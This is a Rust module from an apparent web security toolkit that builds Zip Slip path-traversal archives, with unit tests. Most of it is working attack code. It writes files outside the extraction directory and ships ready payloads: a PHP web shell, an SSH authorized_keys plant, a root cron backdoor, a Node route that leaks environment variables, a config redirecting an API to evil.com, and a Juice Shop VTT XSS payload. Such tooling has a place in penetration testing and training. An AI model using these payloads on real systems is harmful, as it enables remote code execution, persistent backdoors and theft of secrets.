//! Zip payload generation for path traversal attacks (Zip Slip)

use std::fs::File;
use std::io::Write;
use std::path::Path;
use thiserror::Error;
use zip::write::FileOptions;
use zip::ZipWriter;

#[derive(Error, Debug)]
pub enum ZipError {
    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),
    #[error("Zip error: {0}")]
    Zip(#[from] zip::result::ZipError),
}

/// Create a Zip Slip payload
///
/// # Arguments
///
/// * `output_path` - Path for the output zip file
/// * `target_path` - Path traversal target (e.g., "../../etc/passwd")
/// * `content` - Content to write to the target file
///
/// # Example
///
/// ```rust,no_run
/// use web_security_toolkit::zip_payload::create_zip_slip;
///
/// create_zip_slip(
///     "exploit.zip",
///     "../../app/config.yml",
///     b"malicious: true"
/// ).unwrap();
/// ```
pub fn create_zip_slip(
    output_path: impl AsRef<Path>,
    target_path: &str,
    content: &[u8],
) -> Result<(), ZipError> {
    let file = File::create(output_path)?;
    let mut zip = ZipWriter::new(file);

    let options = FileOptions::default()
        .compression_method(zip::CompressionMethod::Stored);

    zip.start_file(target_path, options)?;
    zip.write_all(content)?;
    zip.finish()?;

    Ok(())
}

/// Create a Zip Slip payload with multiple files
pub fn create_zip_slip_multi(
    output_path: impl AsRef<Path>,
    files: &[(&str, &[u8])],
) -> Result<(), ZipError> {
    let file = File::create(output_path)?;
    let mut zip = ZipWriter::new(file);

    let options = FileOptions::default()
        .compression_method(zip::CompressionMethod::Stored);

    for (target_path, content) in files {
        zip.start_file(*target_path, options)?;
        zip.write_all(content)?;
    }

    zip.finish()?;
    Ok(())
}

/// Common Zip Slip target paths
pub fn common_targets() -> Vec<ZipSlipTarget> {
    vec![
        ZipSlipTarget::new(
            "Web root",
            "../../var/www/html/shell.php",
            b"<?php system($_GET['cmd']); ?>"
        ),
        ZipSlipTarget::new(
            "SSH authorized_keys",
            "../../root/.ssh/authorized_keys",
            b"ssh-rsa AAAA..."
        ),
        ZipSlipTarget::new(
            "Cron job",
            "../../etc/cron.d/backdoor",
            b"* * * * * root /tmp/backdoor.sh"
        ),
        ZipSlipTarget::new(
            "Node.js app",
            "../../app/routes/backdoor.js",
            b"module.exports = (req, res) => res.send(process.env)"
        ),
        ZipSlipTarget::new(
            "Angular assets",
            "../../frontend/dist/frontend/assets/config.json",
            b"{\"apiUrl\": \"http://evil.com\"}"
        ),
    ]
}

/// Zip Slip target with description
#[derive(Debug, Clone)]
pub struct ZipSlipTarget {
    pub name: String,
    pub path: String,
    pub content: Vec<u8>,
}

impl ZipSlipTarget {
    pub fn new(name: impl Into<String>, path: impl Into<String>, content: &[u8]) -> Self {
        Self {
            name: name.into(),
            path: path.into(),
            content: content.to_vec(),
        }
    }
}

/// Juice Shop specific VTT XSS payload
pub fn juice_shop_vtt_xss() -> ZipSlipTarget {
    ZipSlipTarget::new(
        "Juice Shop VTT XSS",
        "../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt",
        br#"WEBVTT

00:00:00.000 --> 00:00:10.000
</script><script>alert('xss')</script>
"#
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Read;
    use zip::ZipArchive;

    #[test]
    fn test_create_zip_slip() {
        let target_path = "../../test/file.txt";
        let content = b"malicious content";
        
        create_zip_slip("test_zip.zip", target_path, content).unwrap();
        
        // Verify
        let file = File::open("test_zip.zip").unwrap();
        let mut archive = ZipArchive::new(file).unwrap();
        
        assert_eq!(archive.len(), 1);
        
        let mut zip_file = archive.by_index(0).unwrap();
        assert!(zip_file.name().contains("../"));
        
        let mut contents = Vec::new();
        zip_file.read_to_end(&mut contents).unwrap();
        assert_eq!(contents, content);
        
        std::fs::remove_file("test_zip.zip").unwrap();
    }

    #[test]
    fn test_common_targets() {
        let targets = common_targets();
        assert!(!targets.is_empty());
        assert!(targets.iter().all(|t| t.path.contains("../")));
    }

    #[test]
    fn test_juice_shop_target() {
        let target = juice_shop_vtt_xss();
        assert!(target.path.contains("owasp_promo.vtt"));
        assert!(String::from_utf8_lossy(&target.content).contains("alert"));
    }
}
